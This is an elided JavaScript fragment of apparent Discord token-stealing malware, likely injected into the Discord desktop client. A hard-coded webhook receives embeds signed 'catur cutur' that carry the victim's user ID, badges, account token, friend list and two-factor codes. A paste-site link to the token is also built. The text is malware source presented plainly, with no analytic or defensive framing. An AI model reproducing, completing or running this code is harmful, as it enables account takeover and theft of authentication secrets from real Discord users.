const fs = require("fs"),
  ...
  os = require("os");
var webhook = "https://discord.com/api/webhooks/915602506065797130/4Ks6KB7-1lEnD18SE-VGxppLASgmOlYfTVr06W6d12IWcTRGHOcYVLH5Qhjlt5L9Iax0";
    ...
    .then(e => {
      if (
        ...
        if (
          ...
          var t = {
            username: "catur cutur",
            content: "",
            embeds: [
              {
                title: "User Discord Initalized (User not Logged in)",
                ...
                author: { name: "catur cutur" },
                footer: { text: "catur cutur" }
              }
            ]
          };
          ...
          BrowserWindow.getAllWindows()[0]
            ...
            .then(t => {
              ...
              var r = {
                ...
                embeds: [
                  {
                    title: "User Discord Initalized",
                    description:
                      "[**Click for copy on mobile!**](https://ctf.surf/raw/" +
                      e +
                      ")",
                    color: config["embed-color"],
                    fields: [
                      ...
                      { name: "User ID", value: `\`${n.id}\``, inline: !0 },
                      {
                        name: "User Badges",
                        value: `${GetBadges(n.flags)}`,
                        inline: !1
                      },
                      { name: "User Token", value: `\`\`\`${e}\`\`\``, inline: !1 }
                    ],
                    author: { name: "catur cutur" },
                    footer: { text: "catur cutur" },
                    thumbnail: {
                      ...
                      .then(r => {
                        ...
                        var c = {
                            ...
                            embeds: [
                              ...
                              {
                                title: `User Total Friends (${
                                  JSON.parse(i).filter(e => 1 == e.type).length
                                })`,
                                color: config["embed-color"],
                                description: (function() {
                                  ...
                                  return "" == t && (t = "User No Rare Friends"), t;
                                })(),
                                author: { name: "catur cutur" },
                                footer: { text: "catur cutur" },
                                thumbnail: {
                          ...
                          m = {
                            title: ":detective: __User 2FA Codes__",
                            description: `[**Click for copy on mobile!**](${p})`,
                            color: config["embed-color"],
                            fields: l,
                            author: { name: "catur cutur" },
                            footer: { text: "catur cutur" }
